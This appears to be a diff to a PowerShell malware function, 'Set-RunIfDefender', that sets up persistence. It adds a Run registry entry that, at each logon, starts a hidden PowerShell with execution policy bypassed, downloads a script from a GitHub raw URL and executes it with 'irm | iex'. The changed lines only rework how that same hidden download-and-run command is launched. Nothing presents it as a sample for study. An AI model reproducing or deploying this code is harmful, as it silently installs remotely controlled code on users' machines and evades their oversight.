@@ -1,8 +1,9 @@
 function Set-RunIfDefender {
     $rk="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
     $nm="cs"
-    $cmd="powershell.exe -w h -NoP -EP Bypass -c `"irm 'https://raw.githubusercontent.com/egigesajaz080-dot/skdbcdsch/refs/heads/main/jsdkbfj.ps1' | iex`""
-    if(-not(Get-ItemProperty -Path $rk -Name $nm -EA SilentlyContinue)){
+    $ps = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"irm 'https://raw.githubusercontent.com/egigesajaz080-dot/skdbcdsch/refs/heads/main/jsdkbfj.ps1' | iex`""
+    $cmd = "cmd.exe /c start `"`" /min $ps"    
+    if (-not (Get-ItemProperty -Path $rk -Name $nm -ErrorAction SilentlyContinue)) {
         New-ItemProperty -Path $rk -Name $nm -Value $cmd -PropertyType String | Out-Null
     }
 }
